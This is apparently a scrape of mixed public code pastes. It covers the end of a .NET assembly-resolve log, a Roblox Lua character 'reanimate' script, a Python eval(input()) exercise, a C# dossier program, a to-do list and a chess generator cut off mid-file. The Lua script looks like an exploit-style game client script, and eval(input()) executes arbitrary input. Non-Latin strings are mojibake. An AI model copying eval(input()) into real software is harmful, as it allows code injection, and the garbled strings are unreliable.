Resolve: 'System.Net.Http, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Http, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Http.dll'
------------------
Resolve: 'System.Net.WebHeaderCollection, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.WebHeaderCollection, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.WebHeaderCollection.dll'
------------------
Resolve: 'System.Net.WebProxy, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Net.WebProxy, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.WebProxy.dll'
------------------
Resolve: 'System.Net.Mail, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Net.Mail, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Mail.dll'
------------------
Resolve: 'System.Net.NetworkInformation, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.NetworkInformation, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.NetworkInformation.dll'
------------------
Resolve: 'System.Net.Ping, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Ping, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Ping.dll'
------------------
Resolve: 'System.Net.Security, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Security, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Security.dll'
------------------
Resolve: 'System.Net.Sockets, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.Sockets, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.Sockets.dll'
------------------
Resolve: 'System.Net.WebSockets.Client, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.WebSockets.Client, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.WebSockets.Client.dll'
------------------
Resolve: 'System.Net.WebSockets, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Net.WebSockets, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Net.WebSockets.dll'
------------------
Resolve: 'System.Runtime.Numerics, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Numerics, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Numerics.dll'
------------------
Resolve: 'System.Numerics.Vectors, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Numerics.Vectors, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Numerics.Vectors.dll'
------------------
Resolve: 'System.Reflection.DispatchProxy, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.DispatchProxy, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.DispatchProxy.dll'
------------------
Resolve: 'System.Reflection.Emit, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.dll'
------------------
Resolve: 'System.Reflection.Emit.ILGeneration, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit.ILGeneration, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.ILGeneration.dll'
------------------
Resolve: 'System.Reflection.Emit.Lightweight, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Emit.Lightweight, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Emit.Lightweight.dll'
------------------
Resolve: 'System.Reflection.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Reflection.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Reflection.Primitives.dll'
------------------
Resolve: 'System.Resources.Writer, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Resources.Writer, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Resources.Writer.dll'
------------------
Resolve: 'System.Runtime.CompilerServices.VisualC, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.CompilerServices.VisualC, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.CompilerServices.VisualC.dll'
------------------
Resolve: 'System.Runtime.InteropServices.RuntimeInformation, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.InteropServices.RuntimeInformation, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.InteropServices.RuntimeInformation.dll'
------------------
Resolve: 'System.Runtime.Serialization.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Serialization.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Serialization.Primitives.dll'
------------------
Resolve: 'System.Runtime.Serialization.Xml, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Serialization.Xml, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Serialization.Xml.dll'
------------------
Resolve: 'System.Runtime.Serialization.Json, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Serialization.Json, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Serialization.Json.dll'
------------------
Resolve: 'System.Runtime.Serialization.Formatters, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Runtime.Serialization.Formatters, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Runtime.Serialization.Formatters.dll'
------------------
Resolve: 'System.Security.Claims, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Claims, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Claims.dll'
------------------
Resolve: 'System.Security.Cryptography.Algorithms, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Algorithms, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Algorithms.dll'
------------------
Resolve: 'System.Security.Cryptography.Csp, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Csp, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Csp.dll'
------------------
Resolve: 'System.Security.Cryptography.Encoding, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Encoding, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Encoding.dll'
------------------
Resolve: 'System.Security.Cryptography.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Security.Cryptography.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Security.Cryptography.Primitives.dll'
------------------
Resolve: 'System.Text.Encoding.Extensions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Text.Encoding.Extensions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Text.Encoding.Extensions.dll'
------------------
Resolve: 'System.Text.RegularExpressions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Text.RegularExpressions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Text.RegularExpressions.dll'
------------------
Resolve: 'System.Threading, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.dll'
------------------
Resolve: 'System.Threading.Overlapped, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Overlapped, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Overlapped.dll'
------------------
Resolve: 'System.Threading.ThreadPool, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.ThreadPool, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.ThreadPool.dll'
------------------
Resolve: 'System.Threading.Tasks.Parallel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Threading.Tasks.Parallel, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Threading.Tasks.Parallel.dll'
------------------
Resolve: 'System.Transactions.Local, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Transactions.Local, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Transactions.Local.dll'
------------------
Resolve: 'System.Web.HttpUtility, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Found single assembly: 'System.Web.HttpUtility, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Web.HttpUtility.dll'
------------------
Resolve: 'System.Xml.ReaderWriter, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Xml.ReaderWriter, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Xml.ReaderWriter.dll'
------------------
Resolve: 'System.Xml.XDocument, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Xml.XDocument, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Xml.XDocument.dll'
------------------
Resolve: 'System.Xml.XmlSerializer, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Xml.XmlSerializer, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Xml.XmlSerializer.dll'
------------------
Resolve: 'System.Xml.XPath.XDocument, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Xml.XPath.XDocument, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Xml.XPath.XDocument.dll'
------------------
Resolve: 'System.Xml.XPath, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Found single assembly: 'System.Xml.XPath, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
Load from: 'C:\Program Files\dotnet\packs\Microsoft.NETCore.App.Ref\6.0.31\ref\net6.0\System.Xml.XPath.dll'
#endif
"
hL1m8mJN,DesiredAngle Reanimate(Changes animation to old),Sivar,Lua,Friday 21st of June 2024 01:56:39 PM CDT,"game.Players.LocalPlayer.Character:BreakJoints()
   game.Players.LocalPlayer.Character=nil
   Connection = game.Workspace.DescendantAdded:Connect(function(c)
       if c.Name == ""Animate"" then
           c.Disabled=true       
       end
   end)
   repeat wait() until game.Players.LocalPlayer.Character
   Char = game.Players.LocalPlayer.Character
   Died = game.Players.LocalPlayer.Character:WaitForChild(""Humanoid"").Died:Connect(function()
       Connection:Disconnect()
       Died:Disconnect()
   end)
   wait(.1)
   function waitForChild(parent, childName)
local child = parent:findFirstChild(childName)
if child then return child end
while true do
 child = parent.ChildAdded:wait()
 if child.Name==childName then return child end
end
end

local Figure = game.Players.LocalPlayer.Character
local Torso = waitForChild(Figure, ""Torso"")
local RightShoulder = waitForChild(Torso, ""Right Shoulder"")
local LeftShoulder = waitForChild(Torso, ""Left Shoulder"")
local RightHip = waitForChild(Torso, ""Right Hip"")
local LeftHip = waitForChild(Torso, ""Left Hip"")
local Neck = waitForChild(Torso, ""Neck"")
local Humanoid = waitForChild(Figure, ""Humanoid"")
local pose = ""Standing""
local toolAnim = ""None""
local toolAnimTime = 0
local jumpMaxLimbVelocity = 0.75

function onRunning(speed)
if speed>0 then
 pose = ""Running""
else
 pose = ""Standing""
end
end

function onDied()
pose = ""Dead""
end

function onJumping()
pose = ""Jumping""
end

function onClimbing()
pose = ""Climbing""
end

function onGettingUp()
pose = ""GettingUp""
end

function onFreeFall()
pose = ""FreeFall""
end

function onFallingDown()
pose = ""FallingDown""
end

function onSeated()
pose = ""Seated""
end

function onPlatformStanding()
pose = ""PlatformStanding""
end

function onSwimming(speed)
if speed>0 then
 pose = ""Running""
else
 pose = ""Standing""
end
end

function moveJump()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
 RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end

function moveFreeFall()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end

function moveSit()
RightShoulder.MaxVelocity = 0.15
LeftShoulder.MaxVelocity = 0.15
RightShoulder:SetDesiredAngle(3.14 /2)
LeftShoulder:SetDesiredAngle(-3.14 /2)
RightHip:SetDesiredAngle(3.14 /2)
LeftHip:SetDesiredAngle(-3.14 /2)
end

function getTool()
for _, kid in ipairs(Figure:GetChildren()) do
 if kid.className == ""Tool"" then return kid end
end
return nil
end

function getToolAnim(tool)
for _, c in ipairs(tool:GetChildren()) do
 if c.Name == ""toolanim"" and c.className == ""StringValue"" then
  return c
 end
end
return nil
end

function animateTool()

if (toolAnim == ""None"") then
 RightShoulder:SetDesiredAngle(1.57)
 return
end

if (toolAnim == ""Slash"") then
 RightShoulder.MaxVelocity = 0.5
 RightShoulder:SetDesiredAngle(0)
 return
end

if (toolAnim == ""Lunge"") then
 RightShoulder.MaxVelocity = 0.5
 LeftShoulder.MaxVelocity = 0.5
 RightHip.MaxVelocity = 0.5
 LeftHip.MaxVelocity = 0.5
 RightShoulder:SetDesiredAngle(1.57)
 LeftShoulder:SetDesiredAngle(1.0)
 RightHip:SetDesiredAngle(1.57)
 LeftHip:SetDesiredAngle(1.0)
 return
end
end

function move(time)
local amplitude
local frequency
 
if (pose == ""Jumping"") then
 moveJump()
 return
end

if (pose == ""FreeFall"") then
 moveFreeFall()
 return
end

if (pose == ""Seated"") then
 moveSit()
 return
end

local climbFudge = 0

if (pose == ""Running"") then
   if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then
  RightShoulder.MaxVelocity = jumpMaxLimbVelocity
 else 
  RightShoulder.MaxVelocity = 0.15
 end
 if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then
  LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
 else 
  LeftShoulder.MaxVelocity = 0.15
 end
 amplitude = 1
 frequency = 9
elseif (pose == ""Climbing"") then
 RightShoulder.MaxVelocity = 0.5
 LeftShoulder.MaxVelocity = 0.5
 amplitude = 1
 frequency = 9
 climbFudge = 3.14
else
 amplitude = 0.1
 frequency = 1
end

desiredAngle = amplitude * math.sin(time*frequency)

RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
RightHip:SetDesiredAngle(-desiredAngle)
LeftHip:SetDesiredAngle(-desiredAngle)


local tool = getTool()

if tool then

 animStringValueObject = getToolAnim(tool)

 if animStringValueObject then
  toolAnim = animStringValueObject.Value
  -- message recieved, delete StringValue
  animStringValueObject.Parent = nil
  toolAnimTime = time + .3
 end

 if time > toolAnimTime then
  toolAnimTime = 0
  toolAnim = ""None""
 end

 animateTool()

 
else
 toolAnim = ""None""
 toolAnimTime = 0
end
end

Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)

local runService = game:service(""RunService"");

while Figure.Parent~=nil do
local _, time = wait(0.1)
move(time)
end"
MkYNU75h,TupleType,Lyuben_Andreev,Python,Friday 21st of June 2024 01:47:39 PM CDT,"val = eval(input(""–í—ä–≤–µ–¥–µ—Ç–µ –∏–∑—Ä–∞–∑:\t""))  # ""Python""
# –ò–∑–ø–æ–ª–∑–≤–∞–Ω–µ –Ω–∞ —Ç–µ—Ä–Ω–∞—Ä–µ–Ω –æ–ø–µ—Ä–∞—Ç–æ—Ä:
a, b = (val[0], val[-1]) if type(val) == str else (val, type(val))
# –°—Ç–æ–π–Ω–æ—Å—Ç–∏ –Ω–∞ –ø—Ä–æ–º–µ–Ω–ª–∏–≤–∏—Ç–µ:
print(a)
print(b)
"
sarmhtV1,Personal_accounting_number_two,SaNik74,C#,Friday 21st of June 2024 01:42:29 PM CDT,"namespace Personal_accounting_number_two
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string AddDossierCommand = ""Add Dossier"";
            const string OutputAllDossierCommand = ""Output all"";
            const string DeleteDossierCommand = ""Delete"";
            const string ExitCommand = ""Exit"";

            List<string> fullNames = new List<string>();
            List<string> jobTitles = new List<string>();

            bool isWorking = true;

            while (isWorking)
            {
                string userInput;

                Console.WriteLine($""–í–≤–µ–¥–∏—Ç–µ: \n{AddDossierCommand} –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—å–µ.\n{OutputAllDossierCommand} –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤—Å–µ—Ö –¥–æ—Å—å–µ."" +
                    $""\n{DeleteDossierCommand} –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥–æ—Å—å–µ –ø–æ –§–ò–û.\n{ExitCommand} –¥–ª—è –≤—ã—Ö–æ–¥–∞ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã."");
                userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddDossierCommand:
                        AddDossier(fullNames, jobTitles);
                        break;

                    case OutputAllDossierCommand:
                        OutputDossier(fullNames, jobTitles);
                        break;

                    case DeleteDossierCommand:
                        DeleteDossier(fullNames, jobTitles);
                        break;
                    case ExitCommand:
                        Console.WriteLine(""–í—ã –≤—ã—à–ª–∏ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã."");
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        static void AddDossier(List<string> fullNames, List<string> jobTitles)
        {
            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –§–ò–û: "");
            fullNames.Add(Console.ReadLine());

            Console.WriteLine();

            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –¥–æ–ª–∂–Ω–æ—Å—Ç—å: "");
            jobTitles.Add(Console.ReadLine());
        }

        static void OutputDossier(List<string> fullNames, List<string> jobTitles)
        {
            if (fullNames.Count == 0 && jobTitles.Count == 0)
            {
                Console.WriteLine(""–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç."");
            }
            else
            {
                for (int i = 0; i < fullNames.Count; i++)
                {
                    Console.Write($""{fullNames[i]} {jobTitles[i]} - "");
                }
            }
        }

        static void DeleteDossier(List<string> fullNames, List<string> jobTitles)
        {
            int indexForRemove;

            if (fullNames.Count == 0 && jobTitles.Count == 0)
            {
                Console.WriteLine(""–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç."");
                return;
            }

            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –§–ò–û –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥–æ—Å—å–µ:"");

            string fullName = Console.ReadLine();
            indexForRemove = fullNames.BinarySearch(fullName);

            if (indexForRemove >= 0 && indexForRemove < fullNames.Count)
            {
                fullNames.RemoveAt(indexForRemove);
                jobTitles.RemoveAt(indexForRemove);
            }
            else
            {
                Console.WriteLine(""–î–æ—Å—å–µ —Å —Ç–∞–∫–∏–º –§–ò–û –Ω–µ—Ç –≤ –±–∞–∑–µ."");
            }
        }
    }
}
"
8HLHZqkQ,Contoh Solusi Modul 2 DDP 0,CatFishBstrd,Python,Friday 21st of June 2024 01:36:44 PM CDT,"# Daftar tugas
todo_list = []

def add_task(task):
    """"""Menambahkan tugas baru ke dalam daftar""""""
    todo_list.append(task)
    print(f'Tugas ""{task}"" telah ditambahkan ke dalam daftar.')

def remove_task(task):
    """"""Menghapus tugas dari daftar""""""
    if task in todo_list:
        todo_list.remove(task)
        print(f'Tugas ""{task}"" telah dihapus dari daftar.')
    else:
        print(f'Tugas ""{task}"" tidak ditemukan dalam daftar.')

def view_tasks():
    """"""Melihat semua tugas dalam daftar""""""
    if not todo_list:
        print(""Daftar tugas kosong."")
    else:
        print(""Daftar Tugas:"")
        for i, task in enumerate(todo_list, 1):
            print(f'{i}. {task}')

def search_task(keyword):
    """"""Mencari tugas dalam daftar berdasarkan kata kunci (tidak case-sensitive)""""""
    keyword_lower = keyword.lower()
    found_tasks = [task for task in todo_list if keyword_lower in task.lower()]
    if not found_tasks:
        print(f'Tidak ada tugas yang mengandung kata kunci ""{keyword}"".')
    else:
        print(f'Tugas yang mengandung kata kunci ""{keyword}"":')
        for task in found_tasks:
            print(f'- {task}')

def show_menu():
    """"""Menampilkan menu utama""""""
    print(""Menu:"")
    print(""1. Tambah Tugas"")
    print(""2. Hapus Tugas"")
    print(""3. Lihat Tugas"")
    print(""4. Cari Tugas"")
    print(""5. Keluar"")

def main():
    while True:
        show_menu()
        choice = input(""Pilih opsi (1-5): "")
        print()
        if choice == '1':
            task = input(""Masukkan tugas baru: "")
            print()
            add_task(task)
        elif choice == '2':
            task = input(""Masukkan tugas yang ingin dihapus: "")
            print()
            remove_task(task)
        elif choice == '3':
            view_tasks()
        elif choice == '4':
            keyword = input(""Masukkan kata kunci pencarian: "")
            print()
            search_task(keyword)
        elif choice == '5':
            print(""Terima kasih telah menggunakan To-Do List Manager. Sampai jumpa!"")
            break
        else:
            print(""Opsi tidak valid. Silakan pilih antara 1-5."")
        
        print()
    
if __name__ == ""__main__"":
    main()"
vjpvC8p0,kod Petr K last2,max2201111,Python,Friday 21st of June 2024 01:29:20 PM CDT,"import chess
from itertools import permutations, combinations

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    
    for squares in combinations(all_squares, len(pieces)):
        for square_perm in permutations(squares):
            board = chess.Board(None)
            board.clear_board()
            for piece, square in zip(pieces, square_perm):
                board.set_piece_at(square, chess.Piece.from_symbol(piece))
            
            # Kontrola platnosti pro tah b√≠l√©ho
            board.turn = chess.WHITE
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))

            # Kontrola platnosti pro tah ƒçern√©ho
            board.turn = chess.BLACK
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))
    
    return unique_fens

# Generov√°n√≠ v≈°ech mo≈æn√Ωch pozic pro zadan√© figury
